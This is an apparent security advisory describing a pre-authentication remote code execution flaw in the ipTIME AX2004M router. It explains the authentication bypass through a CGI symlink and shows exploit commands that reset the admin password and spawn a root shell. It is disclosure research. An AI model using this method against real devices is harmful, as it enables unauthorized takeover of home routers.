# ipTIME AX2004M pre-auth remote code execution (KVE-2023-0133)

## General information
- Vendor: ipTIME
- Product: AX2004M
- Version: 14.19.0

## Technical details
### Vulnerability analysis

ipTIME AX2004M has a logic bug in validating authentication.

```c
    e_log_init("cgi.timepro");
    if ( httpcon_check_session_url() && !httpcon_auth(1, 1) )
        return 0;
```

This is code from `timepro.cgi` in AX2004M, which supports management of the
device. This binary early exits if the url is session url (i.e., starts from
'/sess-bin') without authentication.

```txt
Port 80
User root
Group root
ServerAdmin root@localhost
VirtualHost
DocumentRoot /home/httpd
UserDir public_html
DirectoryIndex index.html
KeepAliveMax 100
KeepAliveTimeout 10
MimeTypes /etc/mime.types
DefaultType text/plain
AddType application/x-httpd-cgi cgi
AddType text/html html
AddType image/svg+xml svg
ScriptAlias /sess-bin/ /cgibin/
ScriptAlias /nd-bin/ /ndbin/
ScriptAlias /login/ /cgibin/login-cgi/
ScriptAlias /ddns/ /cgibin/ddns/

...

```

Meanwhile, `boa_vh.80.conf` configures the web server of ipTIME AX2004M.  Its
DocumentRoot is `/home/httpd`. This indicates that we can use binaries in the
`/home/httpd`.

```sh
$ ls -als ./home/httpd/cgi
total 476
  4 drwxr-xr-x  2 insu insu   4096 Feb 11 02:32 .
  4 drwxrwxrwx 25 insu insu   4096 Feb 10 10:27 ..
 20 -rwxr-xr-x  1 insu insu  18016 Jan  1  1970 iux.cgi
 20 -rwxr-xr-x  1 insu insu  19372 Jan  1  1970 iux_download.cgi
136 -rwxr-xr-x  1 insu insu 135796 Jan  1  1970 iux_get.cgi
112 -rwxr-xr-x  1 insu insu 113472 Jan  1  1970 iux_set.cgi
  8 -rwxr-xr-x  1 insu insu   5820 Jan  1  1970 service.cgi
172 -rw-r--r--  1 insu insu 173261 Feb 11 02:32 service.cgi.idb
  0 lrwxrwxrwx  1 insu insu     19 Jan  1  1970 timepro.cgi -> /cgibin/timepro.cgi
  0 lrwxrwxrwx  1 insu insu     19 Jan  1  1970 upgrade.cgi -> /cgibin/upgrade.cgi
```

In `/home/httpd/cgi`, there is a symbolic link that points to
`/cgibin/timepro.cgi`. This represents that if we access
`http://{host}/cgi/timepro.cgi`, we can use `timepro.cgi` without
authentication due to the previous check in `timepro.cgi`. Remind that
`timepro.cgi` only checks authentication if a path is a session url.

### How to exploit
Our exploit implements in two steps. First, we use `timepro.cgi` to reset
password to the password that we want. After that, we enable remote support
option in ipTIME AX2004M and use its feature to launch shell. This remote support
option works like backdoor as we can see from other article
(https://live2skull.tistory.com/5).

### How to reproduce
```sh
# NOTE: You need to give a correct captcha by checking the url manually
$ python3 exploit.py --host 192.168.0.1  reset_password
[*] Solve captcha from http://192.168.0.1:80/captcha/72TeDDT7J55urAX28bx39hOdRP8T0ael.gif
uacvu
[+] Successfully reset password: id=admin, pw=pwned

$ python3 exploit.py --host 192.168.0.1  spawn_shell
[+] Successfully enable remotesupport
[*] Solve captcha from http://192.168.0.1:80/captcha/473uqvH5k7pXG268BOq24u14twyBxKhl.gif
xuabm
$ id
uid=0(root) gid=0(root) groups=0(root),0(root)
```

Enjoy [our demo video](https://youtu.be/Z1Jl9S77gRQ) :)

### Credit
- Kanghyuk Lee  (babamba@kaist.ac.kr)
- Insu Yun (insuyun@kaist.ac.kr)
- Anonymous researcher who reported this to KISA earlier than us :)
